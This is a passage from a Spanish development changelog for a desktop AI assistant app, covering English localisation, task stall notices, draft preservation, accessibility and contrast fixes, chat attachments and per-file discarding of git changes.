fuera de los diccionarios; crece por tanda); `tray.i18n.test.ts`; esquema `settings:set`; E2E `i18n.e2e.ts` (arranque en inglés, cambio en vivo a Español y de vuelta, asistente, capturas con `I18N_SHOTS_DIR`).
Fuera de alcance (T4b/T4c): Code, Tareas, Rutinas, navegador integrado, overlay/píldora/Quick Entry y los errores que construye main (siguen en español, incluso con la interfaz en inglés); los prompts de agente
(`resources/opencode/*.md`); los borradores legales (`PRIVACY_DRAFT`/`TERMS_DRAFT`, pendientes de revisión legal); los roles estándar del menú de macOS (los traduce Electron según la configuración regional).

## F8-B27 — Idioma (T4c): lo que construye main y las ventanas con preload propio

Con la interfaz en inglés, los textos que nacen en main y llegan al usuario salen en inglés; con `es` todo queda idéntico (snapshots y tests existentes sin cambios). Main usa el idioma de `src/main/i18n.ts` (`Settings.language`, o los
idiomas del sistema con «Sistema») y `t()` de `@shared/i18n`; los textos viven en un área nueva `merr.*`/`ovl.*` (`src/shared/i18n/{es,en}/mainErrors.ts`).
Alcance migrado: «No se encontró el binario `opencode`…» del asistente (y el estado del motor: «se cerró inesperadamente», «falló N veces», reintento), validación del binario elegido, errores de la pantalla de acceso (`account/service.ts`) y
las dos páginas del navegador del inicio de sesión con Google (también `<html lang>`), motivos de carpetas de confianza (`check.reason`: raíz/home, Papelera, iCloud, Library, sistema, volúmenes de red, credenciales, política de la organización),
errores de Tareas por política de la organización (red del sandbox, Control total, «Siempre permitir»), reglas recordadas, apertura segura, AGENTS.md, errores y avisos de Rutinas (validación, tiempos, plan de Control total, rechazos sin
supervisión, `scheduleLabel`), notificaciones nativas (rutinas, tareas en segundo plano, solicitud de acceso a apps, aprobaciones del navegador), cuadros de diálogo nativos (aprobación del navegador, Elegir carpeta, Adjuntar, Descargar mis
datos, Exportar diagnóstico, Guardar zip/Markdown, Elegir binario), motivos de Control del Mac no disponible, error del atajo de Quick Entry, errores de conectores MCP y menú contextual de la vista previa.
`NetworkSection.networkErrorMessage` ya no filtra con una regex en español: clasifica por causa (la política gestionada `disableCustomHosts` que el renderer ya conoce) y, si no, muestra el texto de main, que ya está en el idioma activo.
Ventanas con preload propio (Quick Entry, overlay, píldora, globo de guía y píldora de grabación): **los preloads no se tocan** (hashes de `out/preload/{quick,overlay,pill,assist,browser-host}.js` idénticos a antes). Main carga cada página
con `?lang=es|en` (`extras/windows.ts › loadLocalizedPage`) y la página lo lee de su propia URL (`renderer/src/lib/page-lang.ts`). Si el idioma cambia, la ventana oculta se recrea la próxima vez que se usa; una ventana visible
se queda en el idioma con que nació hasta que se oculta.
Residuos conscientes (siguen en español): prompts de agente y borradores legales; descripciones de herramientas y resultados del MCP de Control del Mac y del navegador (los lee el modelo); motivos del modo auto (`auto-mode.ts`,
registro de decisiones); texto de los puntos de restauración (omitidos y errores internos), zip/PDF/vista rápida y errores de grabación de skills; límites de pestañas del navegador integrado; informe de diagnóstico exportado; errores de
instalación de la actualización (códigos técnicos); validación de parámetros IPC (`ipc/validate.ts`, `git/service.ts`); `console.*`; y los datos de demostración de la píldora (`#demo-*`, solo desarrollo). Los avisos ya guardados en
`routines.json` (historial) quedan en el idioma que había al producirse.
Guardias: `i18n-coverage.test.ts` ahora incluye los archivos de main y de las ventanas migradas (el detector ignora los argumentos de `console.*`); `main-errors.i18n.test.ts` (es idéntico, en inglés, plural, `withLang`, código
`FULL_ACCESS_NOT_GRANTED` estable); `NetworkSection.test.ts`; E2E `i18n-main.e2e.ts` (error del asistente y del código de acceso en inglés, `check.reason` en los dos idiomas y cambio en vivo, píldora/toma de control/plan, globo y
grabación, Quick Entry recreado en español; capturas con `I18N_T4C_SHOTS_DIR`).

## F8-B26 — Inglés (beta), segunda tanda: Code, Tareas, Rutinas y navegador integrado

Con la interfaz en inglés (Ajustes › General › Idioma) ahora también están en inglés: Code (sesiones, selector de proyecto, compositor, mensajes, herramientas, permisos, panel de cambios, archivos y terminal), Tareas
(inicio, lista, conversación, compositor, consulta lateral, panel de progreso y de proyecto, entregables, cambios, permisos, preguntas, carpetas, red, modo auto, grabación de skills, guía de inicio y la lista de Control del Mac,
incluida `ComputerGrantsList` en Ajustes › Tareas), Rutinas (vista, editor, plantillas, horarios y fechas relativas) y el navegador integrado. Texto visible, `aria-label`/`title`/`placeholder`, plurales (`{one,other}`) y fechas/números
con el idioma activo (`dateLocale()` de `lib/i18n.ts`: `es-CL` con español, así el producto no cambia, y `en-US` con inglés).

- Diccionarios nuevos por área (`es|en/{code,tasks,tasksComputer,routines,browser}.ts`) enchufados con una línea cada uno en `index.ts` (para mezclar sin conflictos con T4c). Prefijos `code.`, `tasks.`, `tasksComputer.`, `routines.`, `browser.`.
- `FOLDER_MODE_LABEL_ES` sale de `shared/ipc-tasks.ts` y pasa a `folderModeLabel(mode)` (renderer, `features/tasks/impl/folder-mode.ts`, claves `tasksSettings.folderMode.*`): `shared/ipc-tasks.ts` no importa i18n y los preloads no cambian.
  `SANDBOX_PROVIDER_NOTICE` (shared/sandbox-providers.ts) pasa a la función `sandboxProviderNotice()`; los textos de `routines-terms.ts` viven ahora en el diccionario.
- Las constantes con texto (`TIER_INFO`, `MODES`, `PERMISSION_MODES`, `MODE_META`, `SCHEDULE_PRESETS`, `ROUTINE_TEMPLATES`, `TASK_STATUS_LABEL`…) son getters o funciones que reciben `t`, de modo que se recalculan al cambiar de idioma sin reiniciar.
- `ModelSelect` (Ajustes) recalculaba el orden de modelos con el idioma global dentro de un `useMemo`: ahora usa `useLocale()` y lo incluye en las dependencias (`ModelSelect.i18n.test.ts` lo vigila).
- Con `es` el producto queda igual (snapshots sin cambios) salvo un detalle: «1 archivo con cambios» en singular (antes «1 archivos…»). Con `en`, los comandos del compositor de Code `/revertir` y `/nueva` se escriben `/undo` y `/new`.
- Se quedan en español a propósito (contratos con el agente o datos persistidos): prompts enviados al modelo (reintentos tras permitir un sitio, «Ya tienes acceso a…», continuación, crear skill, «Sin respuesta»), el marcador de «necesita control total del mac»,
  los rótulos Usuario/Agente de la exportación a Markdown, la marca de adjuntos, `UNDO_POINT_LABEL` (se guarda en el manifiesto de los puntos de restauración), el prefijo de rama `sesion/` y los textos que construye main
  (`disabledReason` y avisos del navegador, `chk.reason`, vista previa de Rutinas): son de T4c.
- Guardias: los archivos de las cuatro áreas entran en `MIGRATED` (`i18n-coverage.test.ts`); E2E `i18n.e2e.ts` ampliado (Tareas, Rutinas, Code y navegador en inglés sin texto en español, y cambio en vivo a Español) con capturas `I18N_SHOTS_DIR/en/` (`tareas-guia`, `tareas-inicio`, `rutinas`, `rutinas-editor`, `code`, `navegador`; claro/oscuro, 820 y 1280 px).

## F8-B30 — Tareas: inglés y supervisión (T6 del plan de calidad: H7, M9, B3)

- **Escalada a Control total en inglés (H7).** `needsFullAccess` (EscalateCard.tsx) reconoce, sin tildes ni mayúsculas, «necesita control total del mac», «needs full mac control», «needs full control of the mac» y el
  marcador neutro `[[ONYX:NEEDS_FULL_CONTROL]]`; `escalationReason` extrae el motivo de cualquiera de las tres formas. El prompt de continuación (`buildContinuationPrompt`) sale en el idioma de la interfaz.
  El marcador se ve en el texto del último mensaje (la conversación no lo oculta): se pide en su propia línea al final.
- **Idioma de la interfaz en el contexto.** `buildTasksSystemPrompt` acepta `lang`; con `en` añade al final una sección «Interface language: English» que traduce los nombres de botones que los prompts citan en español
  (se leen de los diccionarios, así no se desfasan: «Permitir borrar, mover y renombrar», «Usar memoria», «Guardar como PDF», «Crear skill de esta tarea», «Cambiar a Control total y continuar», «Aprobar y empezar», etc.) y
  pide fechas y números en formato inglés. Con `es` el texto es idéntico al de antes (los snapshots no cambian). Lo usan las tareas interactivas y las rutinas.
- **Aviso «Sin actividad» (M9).** El monitor de main calcula, solo para tareas raíz en curso, una huella del último mensaje de sus sesiones en curso (id, nº de partes y tamaño de la última parte) en el mismo sondeo de 3 s;
  si no cambia durante `stallWarnMinutes` (preferencia nueva, 5 por defecto, 0 = no avisar, máximo 240; Ajustes › Tareas › Servidores) marca `quietSince` en la instantánea de actividad. La conversación muestra
  «Sin actividad desde hace N min» (`StallNotice`, `role="status"`). **Solo avisa**: no detiene ni cancela nada y el aviso desaparece al haber avance o al terminar. Una herramienta larga y legítima (p. ej. una compilación
  de 10 min) también lo dispara: el texto lo dice. El aviso de coste por tarea (opcional del plan) no se hizo: no hay datos de coste por tarea en el renderer.
- **Prompts del agente (B3), sin cambiar su semántica de seguridad ni tocar el plan-gate:**
  - `tasks.md`: una sola regla de archivos auxiliares (`./.onyxcode/trabajo/`, `/tmp` solo si una herramienta lo exige; antes había cuatro menciones y «Reglas» decía «usa /tmp»); una sola regla «Pregunta antes de borrar»
    (la sección Mover/renombrar/borrar remite a ella); línea de marcador neutro tras «**Necesita Control total del Mac**: …» para detectar la petición en cualquier idioma; responde en inglés si el contexto indica interfaz en inglés.
  - `computer.md`: «Cómo trabajas» ya no repite el flujo Plan → Aprobar (remite al flujo; pasa de 7 a 6 puntos) y «Acceso por app» no repite el paso 5; añade la misma nota de idioma. El archivo sigue en ~3800 palabras:
    el flujo real y las secciones de herramientas son contenido necesario, así que no se recortó más para no arriesgar comportamiento.
  - `chat.md`: pide citar las URL cuando use `websearch`/`webfetch`.
  - Los prompts son archivos de `resources/opencode/agents/` que main copia a `userData/opencode-config/` al arrancar (no van en el binario de OpenCode). `agent-prompts.test.ts` comprueba cabecera, marcador, flujo de 10 pasos y
    las reglas deduplicadas. Pendiente con modelo real: que `tasks` escriba de verdad el marcador y respete las reglas de temporales tras la deduplicación.
- Pruebas: `EscalateCard.test.ts` (ES, EN, marcador, motivo, continuación), `tasks-prompt.test.ts`, `monitor.stall.test.ts` (umbral, reinicio por avance, 0 = nunca, sin `stop`), `agent-prompts.test.ts`; E2E
  `tasks-stall.e2e.ts` (guion del falso atascado: aviso al minuto, la tarea sigue en curso, desaparece al terminar). Sin cambios en preloads ni en SEGURIDAD.md (no hay semántica de seguridad nueva).

## F8-B28 — Calidad T1: no perder lo que escribe el usuario

- **Code, adjunto sin texto (H1):** pegar o adjuntar una imagen y enviar sin escribir ya produce un mensaje de usuario (solo partes `file`, sin bloque de texto vacío; el motor no lo exige). Afecta a `send`, `enqueue`, `sendNow` y `doSend`. El mensaje de usuario muestra la imagen en miniatura en vez de un recuadro vacío.
- **Borrador (H3):** Chat y Code siguen vaciando el compositor al enviar (respuesta inmediata), pero lo restauran (texto, menciones y adjuntos, solo si no se escribió algo nuevo mientras tanto) si el motor no acepta el envío. `send`/`sendNow` de Code devuelven `boolean`;
  `sendChatMessage` devuelve `true`/`false` y `ChatComposer.onSend` acepta `false`/rechazo como «no se envió». En Chat el compositor se remonta al crearse la conversación, así que el texto vuelve por `insert`. Tareas ya lo hacía.
- **Chat ocupado para siempre (H4):** `sendChatMessage` devuelve la sesión a `idle` si `promptAsync` lanza (red caída) además de si responde con error.
- **Esc en Chat (M5):** detiene la respuesta en curso, como en Code y Tareas (ignora la composición IME).
- **Restos sin traducir (M11):** «Reintento N:» de Tareas, «Texto» de los bloques de código sin lenguaje, los rótulos de los `ErrorBoundary` de `App.tsx` y «Mostrar barra lateral», «Quitar {nombre}» del adjunto de Code y los mensajes de git «no está instalado», «falló» y «archivos sin seguimiento omitidos».
  `App.tsx` entra en `MIGRATED`. `git/service.ts` NO entra: conserva ~13 mensajes de validación en español (ver «Residuos conscientes» de F8-B27).
- Guardias: `store.calidad-t1.test.ts` (Code), `actions.calidad-t1.test.ts` (Chat), el falso gana `POST /__e2e/set { failPrompt: N|-1|0 }` (corta la conexión de `prompt_async`; Chromium reintenta una vez sobre un socket reutilizado, por eso se usa `-1`)
  con su prueba en `server.test.mjs`, y E2E `calidad-t1.e2e.ts` con una prueba por modo (Chat, Code con imagen sin texto, Tareas) más Esc en Chat; capturas con `CALIDAD_SHOTS_DIR`.

## F8-B29 — Calidad T4: rendimiento percibido y transcripciones

- **Diff enorme (M1).** `DiffView` ya no parsea ni resalta sin tope: por encima de 2000 líneas o 300 KB muestra las primeras líneas con un aviso fijo arriba («Se muestran las primeras N líneas de M» + «Mostrar todo»); `clipPatch` corta
  en límite de línea sin recorrer el texto entero con regex. El resaltado va por trozos de 150 líneas con `setTimeout` (primero se pinta texto plano y se colorea después) y no se aplica sobre el umbral (ni siquiera con «Mostrar todo»).
  Medido con `e2e/specs/calidad-t4.e2e.ts` (diff de 50 000 líneas por una herramienta `edit` en Code, PerformanceObserver `longtask`, igual que `perf.e2e.ts`): sin CPU limitada, antes 3289 ms para abrir (4 tareas largas, máx 1692 ms,
  50 001 filas) y ahora 143 ms (1 tarea de 96 ms, 1998 filas); con CPU x4, antes 13 092 ms (máx 6820 ms) y ahora 562 ms (máx 410 ms).
- **«Ir al final» (M6).** Hook común `useStickToBottom` (`lib/conversation/`) y componente `ScrollToEnd` usados por Chat, Code y Tareas: el botón aparece al subir 80 px o más. «Trabajando…» de Code lleva `role="status"`. Los scrollers de Code
  y Tareas quedan dentro de un contenedor `relative` (cambian los snapshots de `MessageStream` y `TaskConversation`: un `div` más y `h-full`).
- **Listas de sesiones (M12).** La lista ya no se corta en 200: el store de sesiones (Chat y Tareas) y el de Code recuerdan el límite por carpeta, avisan si pudo haber más (`moreSessions`) y «Cargar más» sube de 200 en 200. El filtro de Chat,
  la búsqueda de Tareas y la de ⌘K en Code piden todas las sesiones (hasta 10 000) en cuanto se escribe algo.
- Pruebas: unitarias (`DiffView.test.tsx`, `use-stick-to-bottom.test.ts`, `session-paging.test.ts`, `sessions.paging.test.ts` con 250 sesiones falsas) y E2E `calidad-t4.e2e.ts` (diff, «Ir al final» en Code y Tareas, 250 sesiones en Chat; capturas con `T4_SHOTS_DIR`).

## F8-B31 — Calidad T2: errores con salida

- **`friendlyError` con acción (H2, M10).** `action` pasa a `'connect' | 'retry' | 'compact' | null`: `retry` para fallos que pueden ser pasajeros (cuota/429, red, desconocido), `compact` para `ContextOverflowError`, `connect` como antes. `ErrorNotice` y `AssistantError`
  aceptan `onRetry`/`onCompact` y muestran el botón solo si la vista entrega el manejador (se deshabilita mientras corre). El texto del error de contexto menciona ahora «Compáctala o empieza una conversación nueva».
- **Chat: «Reintentar» sin duplicar.** Antes solo salía si la respuesta tenía texto y reenviaba como mensaje nuevo (duplicaba el turno y perdía adjuntos). Ahora `resendFromMessage` detiene la conversación si hace falta, hace `session.revert` hasta el mensaje de usuario,
  quita de pantalla lo posterior y reenvía sus partes (texto y archivos) con `promptAsync`: queda UN solo mensaje de usuario. Si el motor rechaza o no recibe el envío, deshace el `revert` (`session.unrevert`) y recarga para no dejar la conversación recortada.
  El 429/401/red sin texto ya ofrece «Reintentar» tanto en el aviso de la respuesta como en el de la sesión.
- **«Editar y reintentar» (M2).** Chat (lápiz en cada mensaje con texto, editor en línea con nota de que se descartan los posteriores) y Code (lápiz junto a «Revertir», con confirmación porque también deshace los cambios de archivos desde ese mensaje,
  como «Revertir») reutilizan la misma mecánica; en Code `editAndRetry` y `retryLast` viven en el store, reenvían los adjuntos como partes `file` y quitan la marca de `revert` al aceptarse el prompt. Tareas ya tenía el suyo.
- **«Compactar» (M10).** `compactChat` y `compactTask` llaman a `session.summarize` (con el modelo efectivo) y dejan la sesión ocupada hasta el evento de fin; Code ya tenía `compactSession` y ahora también lo ofrece el aviso de error.
- Guardias: `ai-errors.test.ts` (acciones), `actions.calidad-t2.test.ts` (Chat: revert + reenvío sin duplicar ni perder adjuntos, undo si falla, edición, compactar), `store.calidad-t2.test.ts` (Code), snapshots de `ChatMessageList` (botón «Reintentar» en el aviso)
  y `MessageStream` (lápiz). E2E `calidad-t2.e2e.ts` con el falso (guion `error {statusCode:429}` y `ContextOverflowError`): 429 con un solo mensaje de usuario tras reintentar, edición de un mensaje antiguo en Chat y en Code, «Compactar» en Chat y Tareas (`POST summarize`).
  Capturas con `CALIDAD_SHOTS_DIR`. Sin cambios en preloads ni en SEGURIDAD.md.

## F8-B32 — Calidad T3: continuidad del trabajo

- **Terminal de Code que sobrevive (H5).** Decisión de diseño: en vez de mantener montadas (ocultas con `hidden`/`inert`) todas las vistas visitadas, el pty sube a un **registro** (`panels/terminalRegistry.ts`). Se descartó mantener las vistas
  montadas porque Code y Tareas registran atajos globales (`keydown` en `window`/`document`, `focus`), reportan `tasks:viewing` a main (que suprime notificaciones de una tarea «vista») y Code mueve el visor nativo del navegador integrado: tenerlas
  vivas pero ocultas habría hecho que ⌘1…⌘4 o Esc actuaran sobre una vista invisible, que no llegaran avisos de tareas, y habría duplicado el coste de renderizar cada delta de streaming en vistas que nadie mira. El registro guarda por
  proyecto el `Terminal` de xterm (con su scrollback de 5000 líneas) y el id del pty; `TerminalPanel` solo reengancha el elemento DOM al montarse. El shell se mata al cambiar o cerrar el proyecto (`useCode.subscribe`), con «Reiniciar» o al salir
  de la app (main ya mata los ptys al cerrar la ventana/navegar). Efectos: el foco y el scroll de Chat, Code y Tareas siguen comportándose como antes (no hay vistas ocultas); el scroll de la terminal se conserva porque xterm no se recrea.
- **Borradores (H5).** `stores/drafts.ts` guarda el texto del compositor de Chat (por conversación, `chat:<id>`) y de Code (texto y menciones por proyecto y sesión) fuera de los componentes; sobrevive a cambiar de modo y de sesión, no se persiste
  a disco y solo guarda valores no vacíos. Los compositores cambian una línea (`useState` → `useDraft`). Los adjuntos de Code (imágenes) NO se conservan al cambiar de modo. Antes el texto de Code también pasaba de una sesión a otra al cambiar; ahora cada
  sesión tiene el suyo.
- **Salir con tareas en curso (H6).** `before-quit` pregunta «Hay N tareas en curso» con «Salir igualmente» / «Cancelar» (por defecto Cancelar) si el monitor de Tareas tiene trabajo (`busyRootCount`, mismo sondeo de 3 s). Es `dialog.showMessageBox`,
  sustituible en E2E igual que el de guardar (`stubDialog({ messageBoxResponse })`). **No pregunta** cuando la salida no la pide el usuario: el actualizador (`isUpdating()`, que se activa antes de `quit()` en `startSwap`) y el apagado/cierre de sesión
  del sistema (`powerMonitor 'shutdown'`); la decisión es la función pura `needsQuitConfirmation`. En Windows/Linux, «Cancelar» tras haber cerrado la última ventana la recrea. Solo cuenta tareas de Tareas/Rutinas (monitor); las sesiones de Code
  y Chat en curso no disparan el diálogo.
- **«Interrumpida» + «Continuar» (H6).** Al conectar con un servidor de Tareas (una vez por servidor y por carga de la ventana) se revisan, como máximo, las 12 tareas raíz más recientes (≤ 3 días, no archivadas) que NO están ocupadas ni esperan
  permiso/pregunta: si el último mensaje del asistente no tiene `time.completed` ni error (un aborto del usuario sí lo cierra) se marcan en `useTasks.interrupted`. Estado nuevo `interrupted` (icono, etiqueta «Interrumpida» en lista y cabecera, aviso
  «Esta tarea se interrumpió» con «Continuar» que envía un seguimiento en el idioma de la interfaz). La marca se quita al continuar o en cuanto la sesión vuelve a estar ocupada. Una tarea ocupada nunca se marca (ni se consulta). Límite conocido:
  las tareas más antiguas que 3 días o fuera de las 12 más recientes no se revisan; y una tarea cuyo motor sigue «ocupada» en servidor pero sin avance no es «interrumpida» (eso lo cubre el aviso de inactividad de F8-B30).
- Pruebas: unitarias `drafts.test.ts`, `quit-guard.test.ts` (actualizador y apagado nunca preguntan), `interrupted.test.ts` (detección, ocupadas no se marcan, una vez por servidor, marca se quita al volver a trabajar); E2E `calidad-t3.e2e.ts`: pid de la terminal
  y su `sleep 1000` iguales tras Chat → Ajustes → ⌃Tab → Code (con el scrollback), borradores de Chat y Code, tarea interrumpida tras recargar la ventana con el motor «reiniciado» (el falso gana `set { sessionStatus }`) y Cmd+Q con una tarea ocupada
  (Cancelar mantiene la app, Salir igualmente sale). Capturas con `T3_SHOTS_DIR`. Sin cambios en preloads (no hay canales IPC nuevos) ni en SEGURIDAD.md.

## F8-B33 — Calidad T5: accesibilidad y contraste

- **Región `role="log"` acotada (M7).** Antes ninguna vista anunciaba nada. `ConversationAnnouncer` (en Chat, Code y Tareas) es una región solo para lectores de pantalla (`sr-only`, `role="log"`, `aria-live="polite"`) que dice
  «Respuesta terminada» cuando la conversación deja de estar ocupada y «Error: …» (texto amable de `friendlyError`) cuando aparece uno nuevo. **Nunca** anuncia deltas: la transcripción no es una región viva. Al cambiar de conversación no anuncia nada.
- **Compositor de Code como combobox (M7).** El textarea lleva `role="combobox"`, `aria-haspopup="listbox"`, `aria-expanded`, `aria-controls` y `aria-activedescendant` (opciones con `id`), más `aria-label`. Nota: axe marca `aria-allowed-role` (nivel _minor_)
  porque ARIA en HTML solo prevé `combobox` en `input`; se mantiene a propósito (patrón de autocompletado de ARIA 1.2) y requiere comprobar con VoiceOver.
- **`aria-label` en botones solo-icono (M7).** Copiar y Bifurcar de cada mensaje de Code, Bifurcar y Compactar de la barra de Code y Quitar adjunto (que ahora también se ve con el foco del teclado). El punto de estado del pie de la barra lateral era un `span`
  con `aria-label` sin rol (violación _serious_): pasa a `aria-hidden` (el estado ya se lee como texto al lado).
- **Contraste (M8).** Misma paleta, solo más contraste: `--fg-subtle` `#8a91a3`→`#61697c` (claro, 2,97→5,18:1 sobre `--bg`) y `#6c7386`→`#858b9c` (oscuro, 3,92→5,45:1); `--success` `#15803d`→`#14793a` y `--warning` `#b45309`→`#aa4f09` (claro)
  para llegar a 4,5:1 también sobre barra lateral/código/hover; token nuevo `--gold-text` (`#876217` claro, igual al oro en oscuro) para el texto de las insignias doradas (`--gold` queda para iconos). Sobre la fila seleccionada (`bg-active`) el
  texto `text-subtle` usa `--fg-muted`. Capturas antes/después en claro y oscuro (820 y 1280 px) en `scratchpad/shots-c5/{before,after}`.
- **Landmarks (B2).** Tareas tenía un `<main>` dentro del `<main>` de la app (se vuelve `div`); las barras laterales llevan nombre (`aria-label`) para que no choquen como landmarks.
- **Cómo se mide el contraste.** `app/contrast.test.ts` lee `globals.css` y calcula la razón WCAG 2.x de cada token de texto (`fg`, `fg-muted`, `fg-subtle`, `accent`, `success`, `warning`, `danger`, `gold-text`) contra todas las superficies reales
  de cada tema (`bg`, `bg-sidebar`, `bg-elevated`, `bg-hover`, `bg-code`, `bg-inset`, `user-bubble`), `accent`/`gold-text` sobre sus fondos suaves, `accent-fg` sobre `accent`, y que se conserve la jerarquía fg > muted > subtle. Sin navegador: falla en `npm test`.
- **axe-core.** Nueva devDependency `axe-core` (hay que hacer `npm install` al integrar). `e2e/lib/axe.ts` lo inyecta por CDP en claro y oscuro; `calidad-t5.e2e.ts` ejecuta axe (etiquetas wcag2a/aa, wcag21a/aa y best-practice) en Chat, Chat con error 429, Code y Tareas
  con el OpenCode falso, y falla con violaciones _serious_, _critical_ o _moderate_. Antes de la tanda: aria-prohibited-attr y color-contrast (todas las vistas), button-name _critical_ en Code, tres de landmarks en Tareas. Ahora: solo queda
  `aria-allowed-role` _minor_ (compositor de Code). Informes con `T5_AXE_REPORT`; capturas con `T5_SHOTS_DIR`.
- Pendiente de revisión manual con VoiceOver: que «Respuesta terminada»/errores se lean una vez y sin interrumpir, el comportamiento del combobox (anuncio de la opción activa al usar ↑↓) y el orden de foco; axe no sustituye esa prueba. Cambian los snapshots de
  `ChatMessageList`, `MessageStream` y `TaskConversation` (la región `log`) y `MessageStream` (`aria-label`). Sin cambios en preloads ni en SEGURIDAD.md.

## F8-B35 — Ronda 2 · R2-B: adjuntos en Chat y cobertura E2E

- **Adjuntos en Chat (M4).** El clip del compositor de Chat deja de estar «próximamente»: imágenes (PNG, JPG, GIF, WebP), PDF y archivos de texto, por botón, pegado o arrastrando. Miniaturas (o ficha con el nombre para PDF/texto), «Quitar», aviso accesible
  (`role="alert"`) cuando se rechaza un archivo, y límites: 5 MB por imagen, 10 MB por PDF, 1 MB por texto, 5 adjuntos y 15 MB en total (`lib/attachments.ts`). Se permite enviar solo adjuntos, sin texto. Los adjuntos pendientes viven en el almacén de
  borradores (sobreviven a cambiar de modo, como el texto) y, si el envío falla, vuelven al compositor junto con el texto (también cuando la conversación nueva remonta el compositor). El mensaje de usuario pinta la imagen; «Reintentar» y «Editar y reintentar»
  conservan los adjuntos (ya lo hacían las acciones de T2). Textos nuevos `chat.attach.*` en es/en.
- **Seguridad (ver `docs/SEGURIDAD.md` §3 duodecies).** Verificado con el binario embebido y un proveedor falso que el agente `chat` (`"*": deny`) solo expone `webfetch` al modelo y que un adjunto `data:` viaja como parte del mensaje (imagen y PDF en
  base64, texto en línea) sin acceso al disco. Hallazgo: una parte `file://` se lee del disco saltándose los permisos del agente; por eso `sendChatMessage` solo admite URLs `data:` (error si no). Sin canales IPC nuevos; los hashes de los preloads no cambian.
- **Quick Entry.** `sendChatMessage` desde la entrada rápida (`App.tsx`) ya no deja una promesa rechazada sin atender: el texto vuelve al compositor y el error queda en la conversación si existe.
- **Huecos de prueba de T4.** E2E nuevos (`calidad-r2b.e2e.ts`): «Cargar más» con 250 sesiones en Code y en Tareas, y la búsqueda ⌘K de Code que carga todas las sesiones. Sin cambios de código en esas listas (ya funcionaban).
- Pruebas: unitarias `attachments.test.ts` (clasificación, límites, URL segura) y `actions.r2b.test.ts` (imagen sin texto = una parte `file`, `file://` rechazado sin llamar al motor, red caída → idle); E2E del flujo completo (imagen sin texto, quitar,
  tipo/tamaño rechazado, red caída con restauración de texto y adjunto y un solo mensaje de usuario). Capturas con `R2B_SHOTS_DIR`. Bug cazado por el E2E durante el desarrollo: el adjunto salía sin `filename` (el compositor usa `name`).
- No probado: modelos reales (si un modelo concreto no admite imágenes o PDF el proveedor devolverá su error, que se muestra como cualquier otro); arrastrar archivos desde el Finder en la app empaquetada (el E2E usa el selector); VoiceOver con la lista de adjuntos.

## F8-B34 — Calidad R2-A: descartar cambios, copiar respuesta, MIME de menciones, i18n de git

- **Descartar cambios por archivo (M3).** El panel Cambios de Code tiene «Descartar» (icono al pasar el ratón por la fila o en la cabecera del diff). Diálogo de confirmación con lo que se pierde y la lista de rutas; los archivos nuevos van a la Papelera
  (nunca borrado definitivo) y lo demás vuelve a su última versión de HEAD (índice y árbol). Tras descartar sale un aviso con «Deshacer» (copia previa en `userData/code-discard`, no pisa ediciones posteriores). Operación y validación en main
  (`src/main/git/service.ts`: `discardChanges`/`undoDiscard`); canales nuevos `git:discard` y `git:discardUndo` (contrato, esquema, preload `code.git.discard/discardUndo`, solo ventana principal). Detalle de seguridad en `docs/SEGURIDAD.md` §3 duodecies.
  **No se hizo** descartar por bloque (hunk) ni reutilizar el almacén de puntos de restauración de Tareas (viven en carpetas aprobadas de Tareas; aquí se usa copia propia + Papelera): queda como mejora.
- **Copiar respuesta en Code (B2).** Botón «Copiar respuesta» bajo la respuesta del asistente (texto de sus bloques de texto; en el último turno siempre visible, en los demás al pasar el ratón; no aparece mientras responde). Cambia el snapshot de `MessageStream`.
- **MIME de las menciones `@archivo` (B1).** Imágenes (`png/jpg/jpeg/gif/webp/bmp/avif/heic`) y PDF se envían con su MIME; el resto sigue como `text/plain` (`mention-mime.ts`).
- **i18n de `git/service.ts`.** Los 13 mensajes de validación pasan a `common.git.*` (es/en) y el archivo entra en `MIGRATED`; con `es` el texto es idéntico.
- Pruebas: `git/discard.test.ts` (18 casos con repos temporales reales y Papelera de pruebas: restaurar modificado/borrado/staged, nuevo y añadido a la Papelera, renombre, enlaces, rutas fuera del repo/`..`/`.git`/raíz, todo o nada, ignorados, conflicto, repo sin
  commits, fallo de Papelera, deshacer y su rechazo), `schemas.test.ts` (canales solo de la principal, esquemas), `discard-logic.test.ts`, `mention-mime.test.ts`; E2E `calidad-ra.e2e.ts` (repo real: cancelar no toca nada, confirmar restaura, «Deshacer»,
  archivo nuevo a la Papelera de pruebas, rutas hostiles rechazadas por el canal). Capturas con `RA_SHOTS_DIR`.

## F8-B36 — Calidad R2-C: accesibilidad en las vistas que faltaban

- **Cobertura.** `e2e/specs/calidad-rc.e2e.ts` ejecuta axe-core (claro y oscuro; wcag2a/aa, wcag21a/aa y best-practice) y falla con violaciones _serious_, _critical_ o _moderate_ en: las 12 secciones de Ajustes visibles sin cuenta, Rutinas (lista, detalle y editor en sus pestañas de
  programación y modos Tareas/Code), diálogo de confirmación y de prompt, catálogo MCP, paleta de comandos, asistente de primer uso (5 pasos), Tareas (primer uso, confirmar carpeta, permiso, pregunta, escalada, Control total, tarjetas de plan y toma de control, panel del proyecto, grabar una skill),
  Code (confianza de carpeta, paneles Cambios/Terminal/Archivos, selector de sesión, worktree, permiso) y las ventanas propias (píldora de plan/toma de control/estado, guía y grabación). Informe con `RC_AXE_REPORT`, `RC_AUDIT=1` solo cuenta, capturas con `RC_SHOTS_DIR`.
- **Violaciones halladas y arregladas.** Tarjeta de rutina: `role="button"` con un interruptor dentro (_serious_ nested-interactive) → la tarjeta se sigue pudiendo pulsar entera con el ratón, pero el control de teclado/lector es un botón con el nombre y el interruptor queda al lado. Botón de cerrar del selector de sesión de Code sin nombre
  (_critical_, ahora `code.sessions.close`). Campo del diálogo de prompt (renombrar/mover tarea) sin etiqueta (_critical_) y campo de rama del diálogo de worktree sin etiqueta ni nombre del diálogo. Esqueleto de la lista de Chat con `aria-label` en un `div` (_serious_, ahora `role="status"`).
  Vista previa de configuración del catálogo MCP con scroll sin acceso por teclado (_serious_, `tabIndex=0`). Contraste: `--warning` claro `#aa4f09`→`#954308` (aviso de Rutinas, 4,45→5,5:1), `--danger` claro `#c0352b`→`#b52f26` (estado «Error» sobre la fila activa, 4,28→4,76:1),
  `amber-600`→`amber-700` (botón «Permitir» de Control total, insignias de acceso, 3,2→5,0:1), archivos ignorados del panel Archivos `opacity-50`→`opacity-70`, y en las ventanas de píldora/guía/grabación los botones Detener/Terminar (`#dc2626`), Siguiente (`#7c3aed`) y Permitir de la toma de control (`#2563eb`), que con blanco no llegaban a 4,5:1.
  La tarjeta de petición de la píldora es una región con nombre (landmark).
